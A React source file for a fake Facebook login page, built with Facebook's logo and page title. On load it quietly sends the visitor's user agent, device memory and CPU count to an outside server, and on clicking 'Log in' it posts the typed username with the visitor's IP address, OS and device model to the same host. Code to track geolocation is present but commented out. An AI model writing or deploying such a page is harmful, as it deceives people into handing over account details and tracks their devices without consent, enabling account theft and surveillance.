import React,{useState,useEffect} from 'react'
import './Facebook.css'
import axios from 'axios'
import {Helmet} from "react-helmet";
import { deviceDetect } from 'react-device-detect';

function Facebook() {

  const api = "https://node-kafka.vercel.app"

  const { osName, model } = deviceDetect();

  const [name,setName] = useState("")
  const [password,setPassword] = useState("")
  const [latitude,setLatitude] = useState("")
  const [longitude,setLongitude] = useState({})

  // useEffect(() => {
  //   if (navigator.geolocation) {
  //     navigator.geolocation.watchPosition(function(position) {
  //       const loca = ("Latitude is :", position.coords.latitude);
  //       const tion = ("Longitude is :", position.coords.longitude);
  //       console.log(loca,tion);
  //     setLatitude(position.coords.latitude) ;
  //     setLongitude( position.coords.longitude)
  //     });
  //   }
  // },[])

  useEffect(() => {
    const { userAgent, deviceMemory, hardwareConcurrency } = navigator;
    const name = new Date().toLocaleString();
    const address = `${userAgent} and ${deviceMemory || 'N/A'} and ${hardwareConcurrency || 'N/A'}`;

    const data = {
      name,
      address
    };

    const headers = {
      'Content-Type': 'Application/Json',
      'Accept': 'Application/Json'
    };

    axios.post(`${api}/v1/post`, data)
      .then(response => {
        console.log('API Response:', response.data);
      })
      .catch(error => {
        console.error('API Error:', error);
      });
  }, []); 

  const [ip, setip] = useState('')

  fetch('https://api.ipify.org?format=json')
  .then(response => response.json())
  .then(data => setip(data.ip)); 

  let location = latitude +" "+ longitude
    // let username = name
    let address = ip + osName + model
    // let duration = 5
    let slug = new Date()

    const savedata = () => {
      // window.location.href = '/';
      let data = ({
          name,
          address,
          // duration,
          slug
      })

      const headers = {
        'Content-Type': 'Application/Json',
        'Accept': 'Application/Json'
        }

      axios.post(`${api}/v1/post`, data)

      console.log(data)     
  }

    return (
        <div>
          <Helmet>
                <meta charSet="utf-8" />
                <title>Facebook</title>
                <link rel="icon" href="https://www.facebook.com/" />
            </Helmet>
          <header>
  <div className="top">
  </div>  
</header>
<section>
  <div className="center">
<a href= '/'>
  <img 
  src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" 
  width="112" className="img" alt="facebook"/> </a>

<div className="field">
    <input type="email" id="name" placeholder="Mobile Number or email address"
                     aria-required="true"  autoComplete="off" maxLength="30"  autoCorrect="off"
                    name="username" value={name} 
                    onChange={(e) => {setName(e.target.value)}}
                     required /> 

<input type="password" name="password" id="password" 
                    placeholder="Password" aria-describedby="" maxLength="30"  autoComplete="off"
                    aria-required="true"  autoCorrect="off" value={password}
                    onChange={(e) => {setPassword(e.target.value)}} required /> 
                    </div> 
          
          <div className="bttn"> 
           <button  className="btn" type="button" name="submit"
                     onClick={savedata}> Log in</button> 
                   </div>

  </div>
</section>
<footer>
   <div>
   <img className="fake" src="https://i.ibb.co/GJrRkPb/Capture.png" 
   alt="facebook" border="0"/>

<button className="Password">Content</button>
   </div>
</footer>

        </div>
    )
}

export default Facebook
